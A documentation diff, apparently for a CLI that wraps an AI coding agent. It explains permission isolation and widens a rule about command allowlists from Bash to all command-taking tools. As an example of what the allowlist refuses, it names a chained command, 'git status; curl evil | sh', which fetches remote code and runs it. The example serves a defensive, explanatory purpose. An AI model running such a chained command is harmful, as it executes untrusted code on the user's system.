@@ -146,7 +146,7 @@ A first user file:
 }
 ```
 
-Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory; a rule in your file is the grant, a rule in a project file never is, and `defaultDecision` never is. Bash is the one tool with a second condition: a Bash allow rule is a grant only while the `commands` allowlist in your own file is not empty (here, `git`), because that allowlist is what refuses a chained command such as `git status; curl evil | sh` before the allow reaches the SDK; a project file's list never counts, and without yours the rule is still evaluated but the bundled CLI refuses Bash in a headless run. `WebFetch` and `WebSearch` are left out on purpose (R-3); to allow one, add `{ "tool": "WebFetch", "decision": "allow" }` to your file.
+Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory; a rule in your file is the grant, a rule in a project file never is, and `defaultDecision` never is. A command-taking tool (Bash or Monitor, per the table in `src/internal/tool-targets.ts`) has a second condition: its allow rule is a grant only while the `commands` allowlist in your own file is not empty (here, `git`), because that allowlist is what refuses a chained command such as `git status; curl evil | sh` before the allow reaches the SDK; a project file's list never counts, and without yours the rule is still evaluated but the bundled CLI refuses that tool in a headless run. `WebFetch` and `WebSearch` are left out on purpose (R-3); to allow one, add `{ "tool": "WebFetch", "decision": "allow" }` to your file.
 
 Inheriting Claude Code settings:
 
